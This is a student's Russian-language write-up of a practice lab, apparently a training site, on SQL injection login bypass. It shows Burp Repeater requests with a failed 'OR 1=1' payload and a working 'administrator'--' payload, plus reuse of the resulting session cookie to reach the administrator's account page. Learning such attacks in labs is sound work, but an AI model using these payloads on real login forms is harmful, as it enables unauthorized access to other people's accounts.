# Lab2 - SQL injection
## Цель: SQL injection vulnerability allowing login bypass

## Процесс

### Шаг 1 - поймать запрос логина
- Ввел любые данные в форму логина
- Дальше нашел этот POST-запрос на /login
- Send to Repeater

### Шаг 2 - первая попытка
username=administrator' OR 1=1-- &password=admin
Результат -> 400 Bad Request
Причина: OR 1=1 делает условие истинным , тоесть возращает несколько пользователей разом , вместо одного, приложение  не ожидало такогорезультата -> ошибка
Это отличие от Lab1,  в который я хотел вернуть много строк товаров, а не одну строку пользователя

### Шаг 3 - правильный payload
username=administrator'--&password=admin
-- было: SELECT * FROM users WHERE username = 'administrator' AND password = '...'
-- стало: SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'

"--" обрезает все после себя включая проверку пароля.

### Шаг 4 - подтверждение
Ответ: 302 Found, Location: /my-account?id=administrator
Новая кука в Set-Cookie: session=<новое значение>

### Шаг 5 — верификация доступа
В Repeater поменял запрос на: 
```bash
GET /my-account?id=administrator HTTP/2
Cookie: session=<новая кука из шага 4>
```
Тело запроса убрал полностью, т.к у нас GET ,  а не POST

# Итог
- OR 1=1 не универсален - подходит только для возврата множества строк , но ломает там где ожидается ровно одна строка
- После успешной SQLi-инъекции сервер может выдать НОВУЮ сессионную куку — старую нужно заменить на новую для дальнейших запросов от имени "залогиненного" пользователя
- Полный цикл можно пройти целиком через Burp (Proxy → Repeater), не пересаживаясь в браузер
